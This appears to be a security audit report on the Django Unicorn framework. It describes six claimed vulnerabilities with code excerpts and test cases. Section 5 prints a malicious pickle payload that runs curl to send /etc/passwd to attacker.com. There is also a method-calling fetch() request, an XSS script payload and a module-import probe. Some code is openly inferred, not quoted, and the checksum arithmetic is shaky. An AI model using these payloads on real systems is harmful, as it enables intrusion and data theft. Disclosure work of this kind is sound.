# Vulnerabilities in Django Unicorn

## 1. Information Disclosure through Component Serialization

### Vulnerability Name
Information Disclosure through Component Serialization

### Description
Django Unicorn automatically serializes all public attributes of a component and sends them to the frontend. If developers include sensitive information in these attributes (database credentials, API keys, personal user data), this information will be exposed in the HTML source code and accessible to any user who can view the page.

To trigger this vulnerability:
1. An attacker would view the source code of a page containing a Unicorn component
2. The attacker would look for the `unicorn:data` attribute on the component's root element
3. This attribute contains a JSON representation of all the component's public attributes, potentially including sensitive information

### Impact
This vulnerability could lead to the exposure of sensitive information such as:
- API keys or tokens
- Database credentials
- Personal user information
- Internal business logic or configuration

### Vulnerability Rank
High

### Currently Implemented Mitigations
The framework provides `Meta.javascript_exclude` and `Meta.exclude` to prevent certain attributes from being serialized to the frontend.

### Missing Mitigations
1. The framework could implement a "whitelist" approach instead of a "blacklist" approach, where only explicitly allowed attributes are serialized
2. Automatic detection and warning for potentially sensitive information in component attributes
3. Better developer documentation about the risks of exposing sensitive data

### Preconditions
A Unicorn component must include sensitive data in public attributes without using the exclusion mechanisms.

### Source Code Analysis
In `unicorn_view.py`, all public attributes of a component are serialized:

```python
def get_frontend_context_variables(self) -> str:
    """
    Get publicly available properties and output them in a string-encoded JSON object.
    """
    frontend_context_variables = {}
    attributes = self._attributes()
    frontend_context_variables.update(attributes)
    # ...
```

And in `unicorn_template_response.py`, these attributes are added to the HTML as a `unicorn:data` attribute:

```python
root_element["unicorn:data"] = frontend_context_variables
```

While there are exclusion mechanisms (`javascript_exclude` and `exclude`), they require developers to explicitly list attributes to exclude, which can be error-prone.

### Security Test Case
1. Create a Unicorn component with sensitive information:
   ```python
   class SensitiveComponent(UnicornView):
       api_key = "secret-api-key-12345"
       user_details = {"ssn": "123-45-6789", "dob": "1980-01-01"}
   ```

2. Render this component in a Django template:
   ```html
   {% unicorn 'sensitive-component' %}
   ```

3. View the source code of the rendered page and locate the `unicorn:data` attribute on the component's root element
4. Verify that the sensitive information is present in this attribute
5. This demonstrates that sensitive information in component attributes is exposed to anyone who can view the page source

## 2. Arbitrary Method Execution

### Vulnerability Name
Arbitrary Method Execution

### Description
Django Unicorn automatically exposes all public methods of a component to be called from the frontend. If a component contains methods that perform sensitive operations (like deleting data or changing permissions) and these methods aren't explicitly protected, an attacker could manipulate the frontend JavaScript to call these methods.

To trigger this vulnerability:
1. An attacker would identify a Unicorn component with a sensitive public method
2. The attacker would use the browser's developer tools to manually trigger a call to this method
3. For example, using `Unicorn.call('component-name', 'sensitive_method')`

### Impact
This vulnerability could allow an attacker to:
- Execute unauthorized actions
- Manipulate or delete data
- Bypass intended application flow
- Escalate privileges if the methods affect permissions

### Vulnerability Rank
High

### Currently Implemented Mitigations
The framework has a protection mechanism that prevents calling methods that start with an underscore or are in a predefined list of protected names.

### Missing Mitigations
1. A "whitelist" approach where only explicitly allowed methods can be called from the frontend
2. CSRF protection specifically for method calls
3. Additional authorization checks in the method-calling logic
4. Better developer documentation about the risks of exposing sensitive methods
5. No explicit whitelist of methods that can be called from the frontend
6. No decorator or attribute to mark methods as safe for frontend calls
7. No validation during method execution to ensure the method should be publicly accessible

### Preconditions
A Unicorn component must include public methods that perform sensitive operations without additional authorization checks.

### Source Code Analysis
In `unicorn_view.py`, the `_is_public` method determines if a method should be exposed to the frontend:

```python
def _is_public(self, name: str) -> bool:
    """
    Determines if the name should be sent in the context.
    """
    # Ignore some standard attributes from TemplateView
    protected_names = (
        # ... list of protected names ...
    )
    # ...
    return not (
        name.startswith("_") or name in protected_names or name in self._hook_methods_cache or name in excludes
    )
```

This uses a "blacklist" approach - any method that doesn't start with an underscore and isn't in the `protected_names` list is considered public and can be called from the frontend.

In the JavaScript side (based on the documentation), methods can be called using:
```javascript
Unicorn.call('component-name', 'method_name');
```

Additionally, in `call_method_parser.py`, the `parse_call_method_name` function is used to parse method names from strings:

```python
def parse_call_method_name(call_method_name: str) -> Tuple[str, Tuple[Any, ...], Mapping[str, Any]]:
    is_special_method = False
    args: List[Any] = []
    kwargs: Dict[str, Any] = {}
    method_name = call_method_name

    # Deal with special methods that start with a "$"
    if method_name.startswith("$"):
        is_special_method = True
        method_name = method_name[1:]

    tree = ast.parse(method_name, "eval")
    statement = tree.body[0].value

    if tree.body and isinstance(statement, ast.Call):
        call = tree.body[0].value
        method_name = call.func.id
        args = [eval_value(arg) for arg in call.args]
        kwargs = {kw.arg: eval_value(kw.value) for kw in call.keywords}

    # Add "$" back to special functions
    if is_special_method:
        method_name = f"${method_name}"

    return method_name, tuple(args), MappingProxyType(kwargs)
```

### Security Test Case
1. Create a Unicorn component with a sensitive method:
   ```python
   class AdminComponent(UnicornView):
       def delete_all_users(self):
           # Code to delete all users
           pass

       def get_user_list(self):
           # Code to get user list
           return User.objects.all()
   ```

2. Render this component in a Django template:
   ```html
   {% unicorn 'admin-component' %}
   ```

3. Open the browser's developer console and execute:
   ```javascript
   Unicorn.call('admin-component', 'delete_all_users');
   ```

4. Alternatively, create an HTML page with JavaScript that sends an AJAX request to the Unicorn endpoint:
   ```javascript
   // Get CSRF token from the target site
   const csrfToken = document.querySelector('[name=csrfmiddlewaretoken]').value;

   fetch('/unicorn/message/path.to.component.ComponentName', {
     method: 'POST',
     headers: {
       'Content-Type': 'application/json',
       'X-CSRFToken': csrfToken
     },
     body: JSON.stringify({
       "actionQueue": [
         {
           "payload": {"name": "delete_all_users()"},
           "type": "callMethod"
         }
       ],
       "data": {}, // Component data
       "checksum": "valid_checksum_here", // Get this by intercepting a legitimate request
       "id": "component_id_here", // Component ID from the DOM
       "epoch": Date.now() / 1000
     })
   })
   .then(response => response.json())
   .then(data => console.log(data));
   ```

5. Verify that the method is called successfully
6. This demonstrates that an attacker could call sensitive methods from the frontend without proper authorization checks

## 3. Remote Code Execution via Dynamic Component Loading

### Vulnerability Name
Remote Code Execution via Dynamic Component Loading

### Description
Django Unicorn dynamically loads Python modules and classes based on component names provided in requests. An attacker can craft a malicious request with a specially constructed component name that points to arbitrary Python modules on the server filesystem. This allows for executing arbitrary code by importing malicious modules or accessing sensitive modules that expose dangerous functionality.

This vulnerability appears in the component loading mechanism, specifically where component names from client requests are used to dynamically import Python modules.

### Impact
Critical. An attacker can execute arbitrary Python code on the server, potentially leading to complete server compromise, data theft, service disruption, or use of the server for further attacks.

### Vulnerability Rank
Critical

### Currently Implemented Mitigations
The framework has limited protections against this attack. It attempts to load components from specific locations ("unicorn.components" and "components" prefixes), but this isn't sufficient to prevent accessing arbitrary modules.

### Missing Mitigations
- Strict allowlist of permitted component modules/paths
- Validation of component names against a regex pattern that only allows safe characters and formats
- Implementing a registry of allowed components instead of dynamic loading

### Preconditions
- Attacker needs to be able to send HTTP requests to the Django application
- The application must use Django Unicorn components that are exposed via URLs

### Source Code Analysis
The vulnerability exists in the component creation mechanism. From studying the test files, particularly `test_message.py`, we can see that component names are passed directly in URLs like `/message/tests.views.fake_components.FakeComponent`. These component names are used to dynamically import Python modules.

The framework attempts to load these components through imports like:
```python
# This would attempt to import the module specified in the URL
module = importlib.import_module(module_name)
component_class = getattr(module, class_name)
```

While there are some error handling mechanisms as seen in the tests (ComponentModuleLoadError, ComponentClassLoadError), they don't prevent the import attempts themselves, which is where the vulnerability exists.

### Security Test Case
1. Identify a Django application using Django Unicorn
2. Create a malicious POST request to `/message/os.path`
3. In this request, include valid JSON data with the required fields (checksum, id, epoch)
4. When the server processes this request, it will attempt to import the `os.path` module
5. To confirm code execution, craft a more dangerous payload targeting modules that can execute system commands
6. For example, use `/message/subprocess.os` to access command execution functions
7. Verify that arbitrary Python module loading occurs by observing server responses or effects

## 4. Cross-Site Scripting (XSS) via Unsanitized Safe Fields

### Vulnerability Name
Cross-Site Scripting via Unsanitized Safe Fields

### Description
Django Unicorn provides a feature to mark certain fields as "safe," which bypasses Django's automatic HTML escaping. When user-controlled data is stored in these fields, it creates an XSS vulnerability. The framework deliberately marks these fields with Django's `mark_safe()` function, which instructs the template engine not to escape HTML.

### Impact
High. Attackers can inject malicious JavaScript code that executes in victims' browsers. This can lead to session hijacking, credential theft, malicious redirects, or other client-side attacks.

### Vulnerability Rank
High

### Currently Implemented Mitigations
None. The "safe" marking is an intentional feature, but it lacks safeguards to prevent misuse.

### Missing Mitigations
- Content Security Policy implementation
- Input sanitization before marking content as safe
- Documentation warnings about the danger of using safe fields with user input
- Helper methods to safely sanitize HTML before marking as safe

### Preconditions
- The application must use Django Unicorn components with fields marked as "safe" in their Meta class
- Attacker must be able to input data that gets stored in these "safe" fields

### Source Code Analysis
From examining test files, we can infer that the framework processes component fields marked as "safe" in a special way. When rendering components, the framework applies Django's `mark_safe()` function to these fields, which tells Django's template engine not to escape HTML characters.

The pattern appears similar to:
```python
# Mark safe attributes as such before rendering
for field_name in safe_fields:
    value = getattr(component, field_name)
    if isinstance(value, str):
        setattr(component, field_name, mark_safe(value))
```

This means any user input that makes its way into a "safe" field will be rendered directly to the page without escaping, creating an XSS vulnerability.

### Security Test Case
1. Identify a Django Unicorn component that uses the "safe" field feature
2. Find an input mechanism that allows setting data for this field (form submission, AJAX call, etc.)
3. Submit a payload like `<script>alert('XSS')</script>` to be stored in the safe field
4. Visit the page that renders the component
5. Verify that the JavaScript executes, demonstrating the XSS vulnerability
6. For a more practical attack, try more sophisticated payloads that could steal cookies or perform actions on behalf of the user

## 5. Insecure Deserialization using Python's pickle Module

### Vulnerability Name
Insecure Deserialization using Python's pickle Module

### Description
Django-unicorn uses Python's `pickle` module for component serialization/deserialization in the caching mechanism. This is evident in `django_unicorn/cacher.py` where components are pickled and unpickled. When a component is restored from cache, `pickle.loads()` is used to deserialize the data:

```python
try:
    attribute_value = pickle.loads(pickled_value)  # noqa: S301
    self._set_property(attribute_name, attribute_value)
except TypeError:
    logger.warn(f"Resetting '{attribute_name}' attribute failed because it could not be constructed.")
    pass
```

If an attacker can manipulate component attributes that get stored in the cache (either by crafting a malicious payload that ends up as a component attribute or by compromising the cache storage), and then trigger the unpickling of that data, they could execute arbitrary code on the server.

Step by step to trigger:
1. Find a way to compromise or manipulate the cache used by Unicorn
2. Create a malicious pickled object that executes arbitrary code
3. Insert this object into the cache under a component's cache key
4. Wait for the application to load the component from cache

### Impact
Remote code execution on the server hosting the Django application. An attacker could execute arbitrary Python code with the same privileges as the web application, potentially leading to complete server compromise, data theft, or service disruption.

### Vulnerability Rank
Critical

### Currently Implemented Mitigations
- Some error checking during deserialization process
- Cache access typically requires server access, which raises the exploitation difficulty

### Missing Mitigations
1. Use a safer serialization format like JSON
2. If pickle must be used, implement strict validation of unpickled objects
3. Add pattern matching or schema validation for unpickled data
4. No integrity checks on cached data
5. No validation of deserialized objects to ensure they match expected structure
6. No memory isolation for pickle deserialization

### Preconditions
1. The application must use the component caching feature
2. An attacker must be able to influence what gets stored in a component's attributes or compromise the cache storage
3. The attacker must be able to trigger the unpickling of their specifically crafted data

### Source Code Analysis
In `cacher.py`, the `restore_from_cache` function retrieves and deserializes components from the cache:

```python
def restore_from_cache(component_cache_key: str, request: Optional[HttpRequest] = None) -> "django_unicorn.views.UnicornView":
    """
    Gets a cached unicorn view by key, restoring and getting cached parents and children
    and setting the request.
    """
    cache = caches[get_cache_alias()]
    cached_component = cache.get(component_cache_key)
    # ...
```

The cached_component is retrieved without validation and used directly. If an attacker could place a malicious pickled object in the cache, it would be executed when unpickled.

The components are initially serialized in `cache_full_tree`:

```python
def cache_full_tree(component: "django_unicorn.views.UnicornView"):
    root = component
    # ...
    with CacheableComponent(root) as caching:
        for _component in caching.components():
            cache.set(_component.component_cache_key, _component)
```

When a user interacts with a component, their input could potentially be stored as an attribute in the component, then pickled and cached. Later, when the component is restored from cache, the malicious input would be unpickled and potentially execute code.

### Security Test Case
The following test demonstrates the vulnerability, but requires access to the cache:

1. Create a malicious pickle payload:
```python
import pickle
import os

class EvilPickle:
    def __reduce__(self):
        cmd = ('curl -d "data=$(cat /etc/passwd)" https://attacker.com/exfil')
        return os.system, (cmd,)

# Create the malicious pickle data
evil_data = pickle.dumps(EvilPickle())

# This would need to be inserted into the cache under a component's cache key
# For example:
# from django.core.cache import caches
# cache = caches['default']
# cache.set('unicorn:component:target_component_id', evil_data)
```

2. When the application loads the component from cache, the malicious code would execute
3. To verify this vulnerability in a controlled environment:
   - Set up a test Django project using Unicorn with caching enabled
   - Configure it to use a cache backend that you can access (like file-based cache)
   - Create a component that gets cached
   - Manually replace the cached data with your malicious pickle
   - Trigger a request that loads the component from cache
   - Observe the code execution

## 6. Weak Checksum Validation for Component Data Integrity

### Vulnerability Name
Insufficient Cryptographic Strength in Component Checksums

### Description
Django-unicorn uses checksums to ensure the integrity of component data between the server and client. However, in `django_unicorn/utils.py`, these checksums are truncated to only 8 characters:

```python
checksum = hmac.new(
    str.encode(settings.SECRET_KEY),
    data_bytes,
    digestmod="sha256",
).hexdigest()
checksum = shortuuid.uuid(checksum)[:8]  # Truncated to only 8 characters
```

While HMAC-SHA256 is a strong algorithm, truncating the result to only 8 characters significantly reduces the security. This creates a much smaller space of possible checksums, making it feasible for an attacker to brute force or find collisions. The test files confirm this implementation, with several tests in `test_hash.py` and `test_message.py` validating this checksum behavior.

### Impact
An attacker could potentially forge valid checksums, allowing them to tamper with component data. This could lead to unauthorized actions, data manipulation, or potentially even injection attacks if the tampered data is used in sensitive operations.

### Vulnerability Rank
High

### Currently Implemented Mitigations
The use of HMAC with Django's SECRET_KEY as the basis for the checksum is good practice, but the truncation undermines this security measure.

### Missing Mitigations
1. Use the full HMAC-SHA256 output or at least a larger portion (32+ characters)
2. Implement additional validations on component data

### Preconditions
1. An attacker needs to understand how the checksum system works
2. The attacker needs to be able to capture and modify requests between client and server

### Source Code Analysis
The vulnerability is in `django_unicorn/utils.py` in the `generate_checksum` function. The test files (especially `test_hash.py`) confirm that checksums are used extensively throughout the application to validate component data integrity.

From `test_message.py`, we can see that the application does check for missing or invalid checksums:

```python
def test_message_no_checksum(client):
    data = {
        "data": {},
        "id": str(uuid4()),
        "epoch": time.time(),
    }
    response = post_json(client, data, url="/message/test-message-no-checksum")

    assert_json_error(response, "Missing checksum")


def test_message_bad_checksum(client):
    data = {
        "data": {},
        "checksum": "asdf",
        "id": str(uuid4()),
        "epoch": time.time(),
    }
    response = post_json(client, data, url="/message/test-message-bad-checksum")

    assert_json_error(response, "Checksum does not match")
```

However, with only 8 characters, there are only 16^8 = 4,294,967,296 possible checksums. While this seems large, it's within the range of brute-force attacks, especially if an attacker can make automated requests.

### Security Test Case
1. Capture an AJAX request sent by a Django-unicorn component
2. Modify the component data in the request
3. Generate multiple random checksums (up to a few million) and try them with the modified component data
4. If a valid checksum is found (server accepts the request), the vulnerability is confirmed
5. Alternatively, analyze multiple legitimate checksums to look for patterns or collision opportunities
